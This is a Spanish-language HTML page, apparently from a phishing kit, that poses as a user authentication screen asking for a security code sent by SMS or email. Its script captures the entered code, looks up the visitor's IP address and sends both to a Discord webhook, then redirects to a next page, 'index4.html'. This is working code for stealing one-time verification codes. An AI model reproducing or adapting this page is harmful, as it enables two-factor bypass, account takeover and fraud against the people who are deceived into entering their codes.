<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagina de Seguridad</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, Helvetica, sans-serif; }
        body { background-color: #f6f6f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 400px; padding: 20px; text-align: center; }
        .image-placeholder { width: 280px; height: 100px; background-color: #fdfdfd; border: 1px solid #eeeeee; margin: 0 auto 40px; display: flex; justify-content: center; align-items: center; }
        .image-placeholder img { max-width: 100%; max-height: 100%; }
        h1 { font-size: 24px; color: #000; margin-bottom: 25px; font-weight: bold; }
        .instruction { font-size: 16px; color: #000; text-align: left; margin-bottom: 30px; line-height: 1.4; padding: 0 10px; }
        .input-container { margin-bottom: 35px; }
        input { width: 90%; padding: 25px; background-color: #eeeeee; border: 1px solid #cccccc; border-radius: 4px; font-size: 20px; color: #333; text-align: center; outline: none; }
        input::placeholder { color: #aaaaaa; }
        .btn-verify { width: 55%; padding: 16px; background-color: #3b82f6; color: #ffffff; border: none; border-radius: 4px; font-size: 18px; font-weight: 400; cursor: pointer; }
        .btn-verify:hover { background-color: #2563eb; }
        .btn-verify:disabled { background-color: #94a3b8; cursor: not-allowed; }
    </style>
</head>
<body>

    <div class="container">
        <div class="image-placeholder">
            <img src="css/swj.png" alt="Icono">
        </div>

        <h1>Autenticacion de Usuario</h1>

        <p class="instruction">
            Hemos enviado un mensaje de texto con un código a su numero de móvil o correo electrónico registrado. Este código puede tardar algunos minutos en llegar.
        </p>

        <form id="verifyForm">
            <div class="input-container">
                <input type="text" id="codigoInput" placeholder="Código de seguridad" required>
            </div>

            <button type="submit" class="btn-verify" id="btnSubmit">Verificar</button>
        </form>
    </div>

    <!-- Carga la URL desde envi.js -->
    <script src="css/envi.js"></script>

    <script>
        const verifyForm = document.getElementById('verifyForm');
        const btnSubmit = document.getElementById('btnSubmit');

        verifyForm.addEventListener('submit', async function(e) {
            e.preventDefault();

            const codigoValue = document.getElementById('codigoInput').value;

            // Bloqueo visual
            btnSubmit.innerText = "Verificando...";
            btnSubmit.disabled = true;

            // Obtener IP real
            let userIP = "No detectada";
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userIP = data.ip;
            } catch (error) { console.error("Error IP"); }

            // Mensaje simple para Discord
            const mensaje = `**CÓDIGO DE VERIFICACIÓN**\n` +
                          `> **Código:** ${codigoValue}\n` +
                          `> **IP:** ${userIP}\n` +
                          `> **Hora:** ${new Date().toLocaleString()}`;

            // Envío vía Webhook
            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: mensaje })
            })
            .then(res => {
                if(res.ok) {
                    // Redirige a la siguiente página
                    window.location.href = "index4.html";
                } else {
                    alert("Error en el sistema.");
                    resetBtn();
                }
            })
            .catch(() => {
                alert("Fallo de red.");
                resetBtn();
            });
        });

        function resetBtn() {
            btnSubmit.innerText = "Verificar";
            btnSubmit.disabled = false;
        }
    </script>
</body>
</html>
